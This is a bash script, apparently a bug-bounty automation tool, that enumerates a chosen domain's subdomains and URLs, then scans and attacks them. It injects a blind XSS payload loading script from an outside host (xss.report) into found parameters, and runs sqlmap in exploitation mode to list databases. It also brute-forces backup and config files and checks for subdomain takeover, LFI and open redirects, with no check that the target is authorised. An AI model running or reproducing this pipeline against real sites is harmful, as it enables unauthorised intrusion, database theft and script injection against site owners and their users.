#!/bin/bash

# A reconnaissance and scanning tool for Kali Linux

# Ensure required dependencies are installed
function check_dependencies() {
    dependencies=("subfinder" "httpx-toolkit" "katana" "nuclei" "gf" "dirsearch" "sqlmap" "subzy" "python"  "openredirex")
    for dep in "${dependencies[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo "Error: $dep is not installed. Install it using apt, pip, or clone its repository."
            exit 1
        fi
    done
}

check_dependencies

# User inputs
read -p "Enter domain (e.g., example.com): " domain
read -p "Enter output directory: " output_dir

# Create output directory if it doesn't exist
mkdir -p "$output_dir"
cd "$output_dir" || exit

# Step 1: Subdomain enumeration
echo "[+] Running Subfinder..."
subfinder -d "$domain" -all -recursive > subdomains.txt

# Step 2: Filter live subdomains
echo "[+] Checking live subdomains with httpx..."
cat subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 -silent > subdomains_alive.txt

# Step 3: URL enumeration
echo "[+] Extracting URLs with Katana..."
#katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -hf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg > allurls.txt
katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff,css,png,jpg,woff2,jpeg,gif,svg -o allurls.txt


# Step 4: Extract JavaScript files
echo "[+] Extracting JS files..."
grep -E "\.js$" allurls.txt > js.txt

# Step 5: Nuclei scan for exposures
echo "[+] Running Nuclei scans for JS files..."
nuclei -list js.txt -t ~/nuclei-templates/http/exposures/ -c 30

# Step 6: Sensitive file search
echo "[+] Searching for sensitive files..."
grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|_config" allurls.txt > sensitive_files.txt

# Step 7: Directory brute-forcing
echo "[+] Running Dirsearch..."
dirsearch -u "https://$domain" -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,lock,log,rar,old,sql,sql.gz,sql.zip,tar.gz,tar,bz2,txt,wadl,zip,log,xml,js,json -o dirsearch_results.txt

# Step 8: Automated XSS scanning
echo "[+] Running automated XSS scans..."
cat subdomains_alive.txt | katana -ps -f qurl | gf xss | bxss -appendMode -payload "<script src=https://xss.report/c/coffinxp></script>"

echo "[+] Running automated sensitive for xsss scans..."

cat subdomains.txt | httpx -mc 403 > 403_sub.txt  

cat 403_sub.txt | dirsearch --stdin --exclude-status=401,404,403,429 -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp

# Step 9: Subdomain takeover checks
echo "[+] Checking for subdomain takeovers..."
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

# Step 10: CORS misconfiguration check
echo "[+] Checking for CORS misconfigurations..."
#python3 ~/Tools/corsy/corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

nuclei -l subdomains_alive.txt -no-mhe

# Step 11: CVE scanning
echo "[+] Running Nuclei CVE scans..."
nuclei -list subdomains_alive.txt -tags cves,osint,tech

# Step 12: LFI scanning
echo "[+] Searching for LFI vulnerabilities..."
cat allurls.txt | gf lfi | nuclei -tags Lfi

# Step 13: Open redirect scanning
echo "[+] Searching for open redirects..."
cat allurls.txt | gf redirect | openredirex -p ~/openRedirect/

# Step 14: SQL injection detection and exploitation
echo "[+] Running SQLi detection and exploitation..."
cat subdomains_alive.txt | gf sqli > sql.txt
sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli_results.txt

echo "[+] All tasks completed. Check the '$output_dir' directory for results."
